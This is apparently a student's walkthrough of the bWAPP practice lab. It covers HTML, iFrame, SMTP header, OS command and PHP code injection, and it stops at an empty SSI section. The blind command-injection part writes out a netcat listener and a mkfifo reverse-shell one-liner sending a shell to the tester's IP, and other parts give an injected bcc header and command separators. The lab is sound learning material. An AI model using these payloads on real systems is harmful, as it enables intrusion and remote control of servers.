 <h1>Bwapp</h1>

#Low level

HTML Injection - Reflected (GET)

  -First, try to type infomation
  
  <img width="273" height="282" alt="image" src="https://github.com/user-attachments/assets/281910f0-62bb-4a17-8f7f-398753a581e5" />

  -Second, we can try to catch the packet by using Burp Suite and look through a get method

  <img width="747" height="352" alt="image" src="https://github.com/user-attachments/assets/84b6325a-33b4-4067-9a94-183545d03e66" />

  -Third, we can try to use a common tag in html is h1 to observe the output (We can try in the website or in Burp Suite)

  <img width="1187" height="301" alt="image" src="https://github.com/user-attachments/assets/e13ae253-5811-4dbb-95d3-af7a33fec8e2" />

  <img width="306" height="421" alt="image" src="https://github.com/user-attachments/assets/bd90769d-403b-412e-9f0f-30cbe26dec52" />

  -We can see this format is different from the first one, so it can be vulnerable
  
HTML Injection - Reflected (POST)

  -This one can be done by the same steps as GET method. However, we can use Burp Suite to observe the difference between get and post method.
  
HTML Injection - Reflected (URL)

  -This is the first appearence of the page, focus on the URL
  
  <img width="832" height="123" alt="image" src="https://github.com/user-attachments/assets/1c89f340-a454-4674-8039-0884b714a3d0" />

  -First, use Burp Suite to see packet

  <img width="586" height="376" alt="image" src="https://github.com/user-attachments/assets/1c83f19f-c705-47d3-ad34-1ab05e2c62fd" />

  -Second, try to change the host destination to observe the difference in the website
  
  <img width="1176" height="315" alt="image" src="https://github.com/user-attachments/assets/143ac81c-91a1-4735-862e-26620db06882" />

  -Now, your URL is changed

  <img width="702" height="143" alt="image" src="https://github.com/user-attachments/assets/ba2afee0-7471-4e2f-9262-d5fbcc010c10" />

HTML Injection - Stored (Blog)

  -Let's try to type a normal text into the box

  <img width="926" height="367" alt="image" src="https://github.com/user-attachments/assets/29ab4942-3684-4eec-9894-0896a20e1b4c" />

  -Firt of all, when we see a box which can be typed into, we can try to use tag h1 to test. You can see the output is different from the first one

  <img width="927" height="480" alt="image" src="https://github.com/user-attachments/assets/86496813-d736-4ed1-8f9a-f14a95bed323" />

  -Now, we can use a tag script to test xss and observe the output here

  <img width="1481" height="510" alt="image" src="https://github.com/user-attachments/assets/f9344637-ef46-4df2-90a5-8ecb00649a6d" />

iFrame Injection
  -First, look through the URL
  
  <img width="628" height="23" alt="image" src="https://github.com/user-attachments/assets/25e4a945-4dfc-436f-a75f-8669f8bae124" />

  -In this site, we can also see some useful information

  <img width="437" height="300" alt="image" src="https://github.com/user-attachments/assets/63bb5acb-b370-43b9-b0c6-0ad6c2d4b939" />

  -Now, based on such information, we can try to change the robots.txt in the URL by any disallow folder the webite gives us. Here i changed robots.txt by admin

  <img width="600" height="26" alt="image" src="https://github.com/user-attachments/assets/4694816e-a2ae-4bf7-b579-e2913f9d8deb" />

  -Now, we can easily see the difference below

  <img width="455" height="411" alt="image" src="https://github.com/user-attachments/assets/adea3967-bc86-4e76-8af2-b4fad4a742ac" />

  -However, the frame is too small. We can try to change the ParamWidth and ParamHeight in the URL to another bigger numbers

  <img width="607" height="30" alt="image" src="https://github.com/user-attachments/assets/3f83c106-5a5f-4396-bdf4-736ec1a9ba50" />

  -Now, the frame below is clearer

  <img width="935" height="882" alt="image" src="https://github.com/user-attachments/assets/7111356c-6e28-4850-8187-414ea7ec6423" />

Mail Header Injection (SMTP)

  -First, we type into boxes and use Burp Suite to catch the packet

  <img width="597" height="356" alt="image" src="https://github.com/user-attachments/assets/29ed1c77-457d-47cc-b39b-94cb23401745" />

  Now, we can try to use \nbcc: and type the hacker's email

  <img width="605" height="486" alt="image" src="https://github.com/user-attachments/assets/70a984a5-ede1-4357-8cc0-7df34134964c" />

  -We observe the status 200 means that we are successfull
  
  <img width="610" height="332" alt="image" src="https://github.com/user-attachments/assets/536dfa35-1c52-446f-bde2-7adfe7864386" />

OS Command Injection

  -You only need to use separators like ; or & or  && and use ls -la to see all things in the current directory (You can try another command to test your own :>)

  <img width="932" height="1013" alt="image" src="https://github.com/user-attachments/assets/87b8f92c-cd99-40c7-860b-792099dfebb5" />

OS Command Injection - Blind

  -In this task, if you use the same tips above, you will not see any result, so how can we ensure that the website is OS command injection vulnerable?
  -First, type any domain you want, then use any separators as the previous task with sleep 5(you can change any number, but just need a small one to test). If the website needs to wait the time you type, it is vulnerable

  <img width="726" height="168" alt="image" src="https://github.com/user-attachments/assets/4f965cee-83f6-4488-8d4c-617f732d75a9" />

  -You can see you need to waits about 5 seconds to see the response on the website, so how we can see information?

  -Now use netcat on your kali machine with the command "nc -nlvp 9001" (You can change 9001 with other ports you like)

  <img width="260" height="86" alt="image" src="https://github.com/user-attachments/assets/797ad892-680d-4884-b404-8e2d71b9a3a5" />
  
  -We can use netcat to reverse the shell from the website with the command like this "google.com | rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc Your_IP_Address 9001 >/tmp/f" (Because I used 9001 in the command above so in this command is also 9001) and ping

  <img width="726" height="188" alt="image" src="https://github.com/user-attachments/assets/93338788-c111-47d0-837b-52f8fa827bd7" />

  -You can see you will have a shell now!!!

  <img width="472" height="136" alt="image" src="https://github.com/user-attachments/assets/907ce64b-774e-4070-8666-5c223b15bbde" />
  
PHP Code Injection

  -Click on message on the screen and you will see ?message pop on your URL

  <img width="520" height="180" alt="image" src="https://github.com/user-attachments/assets/07bdfd99-38a5-4dd1-8c13-0bc114206938" />

  -Now first, we change test by phpinfo() to test

  <img width="907" height="1075" alt="image" src="https://github.com/user-attachments/assets/db481184-48ec-4e78-9ed1-3b52716355ef" />

  -Now we know the website is vulnerable 
  
  -Try to use some fucntion to list information

  <img width="437" height="35" alt="image" src="https://github.com/user-attachments/assets/0b8244b0-3a5e-4bb1-b560-d21f3bf9709d" />

  -The result is below

  <img width="551" height="178" alt="image" src="https://github.com/user-attachments/assets/7a084423-7437-4a41-a0fb-897cae206245" />

Server-Side Includes (SSI) Injection
  


  
  

  
